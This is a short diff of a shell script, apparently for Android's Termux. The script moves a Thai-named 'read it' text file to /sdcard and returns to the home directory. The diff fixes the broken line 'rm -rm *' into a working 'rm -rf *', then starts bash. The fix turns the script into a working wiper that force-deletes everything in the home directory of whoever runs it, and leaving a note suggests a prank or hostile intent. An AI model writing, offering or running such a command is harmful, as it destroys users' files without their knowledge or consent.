@@ -13,6 +13,6 @@ cd
 cd K1
 mv อ่านสิ.txt /sdcard
 cd
-rm -rm *
+rm -rf *
 bash
 
